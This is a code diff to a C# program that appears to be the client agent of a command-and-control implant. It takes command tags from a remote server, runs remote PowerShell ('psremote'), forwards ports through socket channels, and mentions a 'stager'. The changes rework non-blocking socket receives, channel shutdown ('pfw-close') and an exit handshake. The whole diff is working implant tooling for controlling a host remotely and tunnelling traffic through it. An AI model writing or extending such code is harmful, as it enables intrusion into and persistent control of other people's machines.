@@ -54,10 +54,12 @@ namespace myclient
         {
             bool part1 = s.Poll(1000, SelectMode.SelectRead);
             bool part2 = (s.Available == 0);
-            Console.WriteLine("Poll: " + part1.ToString());
-            Console.WriteLine("Available: " + part2.ToString());
+            bool part3 = s.Poll(1000, SelectMode.SelectWrite);
+            Console.WriteLine("Poll Read: " + part1.ToString());
+            Console.WriteLine("Poll Write: " + part3.ToString());
+            Console.WriteLine("Available: " + (!part2).ToString());
 
-            if (part1 && part2)
+            if (part1 && part2 && !part3)
                 return false;
             else
                 return true;
@@ -137,7 +139,7 @@ namespace myclient
             //var socket_alive = fwSocket_alive[myuuid];
             byte[] fwq_bytes_toresv = new byte[1024];
             string ret_str = "";
-            Console.WriteLine("timeout: " + socket.ReceiveTimeout.ToString());
+            //Console.WriteLine("timeout: " + socket.ReceiveTimeout.ToString());
             Console.WriteLine("blocking: " + socket.Blocking.ToString());
 
             while (true)
@@ -145,25 +147,73 @@ namespace myclient
                 try
                 {
                     int length_toresv = socket.Receive(fwq_bytes_toresv);
-                    if (length_toresv == 0 && !SocketConnected(socket))
+                    if (length_toresv == 0)
                     {
+                        Console.WriteLine("FINED: Due to resv len == 0");
                         //FINED
                         fwSocket_alive[myuuid] = false;
                         return ret_str;
+
                     }
                     ret_str = ret_str + Encoding.UTF8.GetString(fwq_bytes_toresv, 0, length_toresv);
                 }
                 catch (SocketException se)
                 {
                     Console.WriteLine("SocketException: " + se.ToString());
-                    //assume all received in 5s
-                    if (se.SocketErrorCode == SocketError.TimedOut)
-                    {
-                        return ret_str;
-                    }
+                    Console.WriteLine("SocketErrorcode: " + se.SocketErrorCode.ToString());
                     
-                }
-            }
+                    if (se.SocketErrorCode == SocketError.WouldBlock) //no data this time
+                    {
+                        if (socket.Available == 1) //still some more, keep getting it
+                        {
+                            continue;
+                        }
+
+                        var ifconnected = SocketConnected(socket); //1s delay
+
+                        if (!ifconnected)
+                        {
+                            Console.WriteLine("FINED: Due to not connected");
+                            //FINED
+                            fwSocket_alive[myuuid] = false;
+                            return ret_str;
+                        }
+                        else
+                        {
+                            //check Available again after the delay
+                            if (socket.Available == 1)
+                            {
+                                continue;
+                            }
+                            else
+                            {
+                                //FIN if dummy response
+                                //if (ret_str.Length == 0)
+                                //{
+                                //    fwSocket_alive[myuuid] = false;
+                                //}
+                                //this is not follow spec but needed for stager
+                                //allowing dummy response
+                                return ret_str; //return what we have now
+                            }
+                        }
+                    }//end of would block
+
+                    // if (se.SocketErrorCode == SocketError.ConnectionReset)
+                    // {
+                    //     //CLOSED
+                    //     fwSocket_alive[myuuid] = false;
+                    //     if (ret_str.Length == 0)
+                    //     {
+                    //         //if no message, set it to exit success ... 
+
+                    //     }
+                    //     return ret_str; //return what we have now
+                    // }
+
+
+                }//end of catch
+            }//end of while
         }
         
         private static byte[] ReadPipMessage(PipeStream pipe)
@@ -203,8 +253,8 @@ namespace myclient
                     Console.WriteLine("Waiting for a connection...");
                     target.Connect(remoteEP);
                     Guid myuuid = Guid.NewGuid();
-                    target.Blocking = true;
-                    target.ReceiveTimeout = localSocketTimeout;
+                    target.Blocking = false;
+                    //target.ReceiveTimeout = localSocketTimeout;
                     fwSocket.Add(myuuid, target);
                     fwSocket_alive.Add(myuuid, true);
 
@@ -256,11 +306,11 @@ namespace myclient
                     try
                     {
 
-                        Console.WriteLine("Waiting for a connection...");
+                        //Console.WriteLine("Waiting for a connection...");
                         var t_fwSocket = listener.Accept();
                         Guid myuuid = Guid.NewGuid();
-                        t_fwSocket.Blocking = true;
-                        t_fwSocket.ReceiveTimeout = localSocketTimeout;
+                        t_fwSocket.Blocking = false;
+                        //t_fwSocket.ReceiveTimeout = localSocketTimeout;
                         fwSocket.Add(myuuid,t_fwSocket);
                         fwSocket_alive.Add(myuuid, true);
 
@@ -272,7 +322,7 @@ namespace myclient
 
 
                     }//inner try
-                    catch (SocketException e)
+                    catch (SocketException)
                     {
                         //Console.WriteLine("SocketException : {0}", e.ToString());
                         if (!rh_running[rhuuid])
@@ -399,9 +449,19 @@ namespace myclient
 
                     if (command_tag.ToLower() == "psremote")
                     {
-                        myPsRun.remoteInit(command);
-                        Console.WriteLine("[DEBUG] psremote executed ...");
-                        msg = Encoding.UTF8.GetBytes(MsgPack("PSREMOTE_SUCCESS"));
+                        string reStr = myPsRun.remoteInit(command);
+                        if (reStr == "PSREMOTE_SUCCESS")
+                        {
+                            Console.WriteLine("[DEBUG] psremote executed ...");
+                            msg = Encoding.UTF8.GetBytes(MsgPack("PSREMOTE_SUCCESS"));
+                        }
+                        else
+                        {
+                            Console.WriteLine("[DEBUG] psremote executed with error ...");
+                            msg = Encoding.UTF8.GetBytes(MsgPack(reStr));
+                        }
+
+                        
                         bytesSent = sender.Send(msg);
                         if (bytesSent != msg.Length)
                         {
@@ -589,9 +649,20 @@ namespace myclient
                                         }
                                         else
                                         {
-                                            Console.WriteLine("fwSocket doesn't want response ... ");
-                                            fwSocket[chuuid].Shutdown(SocketShutdown.Both);
-                                            fwSocket[chuuid].Close();
+                                            Console.WriteLine("fwSocket may still receiving ... ");
+                                            if (SocketConnected(fwSocket[chuuid]))
+                                            {
+                                                Console.WriteLine("fwSocket still connected ... ");
+                                                int length_tosend = fwSocket[chuuid].Send(Encoding.UTF8.GetBytes(fwq_string_tosend));
+                                                Console.WriteLine("Response sent");
+                                            }
+                                            else
+                                            {
+                                                Console.WriteLine("fwSocket does not want response ... ");
+                                            }
+
+                                            fwSocket[chuuid].Shutdown(SocketShutdown.Send);
+                                            fwSocket[chuuid].Close(1000);
                                         }
 
                                     }
@@ -646,6 +717,40 @@ namespace myclient
                             Console.WriteLine("Unknown rhuuid ...");
                         }
 
+
+                    }
+
+                    if (command_tag.ToLower() == "pfw-close")
+                    {
+                        //server FINed 
+                        //convert string to uuid
+                        Guid chuuid = new Guid(command);
+
+                        if (fwSocket_alive[chuuid] == true)
+                        {
+                            Console.WriteLine("Clean up ...");
+                            //might need locks
+                            try
+                            {
+                                fwSocket[chuuid].Shutdown(SocketShutdown.Both);
+                                fwSocket[chuuid].Close();
+                            }
+                            catch
+                            {
+
+                            }
+                            
+                        }
+                        
+                        //FW_CH_CLOSE_SUCCESS
+                        msg = Encoding.UTF8.GetBytes(MsgPack("FW_CH_CLOSE_SUCCESS"));
+                        bytesSent = sender.Send(msg);
+                        if (bytesSent != msg.Length)
+                        {
+                            Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
+                        }
+
+                        Console.WriteLine("Clean up finished");
 
                     }
 
@@ -731,9 +836,20 @@ namespace myclient
                             }
                             else
                             {
-                                Console.WriteLine("fwSocket doesn't want response ... ");
-                                fwSocket[chuuid].Shutdown(SocketShutdown.Both);
-                                fwSocket[chuuid].Close();
+                                Console.WriteLine("fwSocket may still receiving ... ");
+                                if (SocketConnected(fwSocket[chuuid]))
+                                {
+                                    Console.WriteLine("fwSocket still connected ... ");
+                                    int length_tosend = fwSocket[chuuid].Send(Encoding.UTF8.GetBytes(fwq_string_tosend));
+                                    Console.WriteLine("Response sent");
+                                }
+                                else
+                                {
+                                    Console.WriteLine("fwSocket does not want response ... ");
+                                }
+
+                                fwSocket[chuuid].Shutdown(SocketShutdown.Send);
+                                fwSocket[chuuid].Close(1000);
                             }
 
                         }
@@ -749,6 +865,27 @@ namespace myclient
 
                     if (command_tag.ToLower() == "exit")
                     {
+                        msg = Encoding.UTF8.GetBytes(MsgPack("EXIT_SUCCESS"));
+                        bytesSent = sender.Send(msg);
+                        if (bytesSent != msg.Length)
+                        {
+                            Console.WriteLine("[DEBUG] Something wrong with send");
+                        }
+
+                        sender.Shutdown(SocketShutdown.Send);
+                        string ack = doRecive(sender);
+                        if (ack == "EXIT_SUCCESS")
+                        {
+                            Console.WriteLine("[EXIT] Success ... ");
+                        }
+                        else
+                        {
+                            Console.WriteLine("[DEBUG] Something wrong with exit");
+                        }
+
+                        
+                        sender.Close(1000);
+                        Console.WriteLine("Closed ... ");
                         break;
                     }
                 }
@@ -775,7 +912,7 @@ namespace myclient
                                 break;
                             }
                         }
-                        catch (SocketException se_inner)
+                        catch //(SocketException se_inner)
                         {
                             Console.WriteLine("Keep trying ...");
                         }
@@ -860,6 +997,8 @@ namespace myclient
 
 
                 }//end of if ps
+
+
 
                 if (command_tag.ToLower() == "exit")
                 {
@@ -946,8 +1085,8 @@ namespace myclient
                     doMagic(sender, remoteEP, null);
 
                     // Release the socket.  
-                    sender.Shutdown(SocketShutdown.Both);
-                    sender.Close();
+                    //sender.Shutdown(SocketShutdown.Both);
+                    //sender.Close();
 
                 }//outer try
 
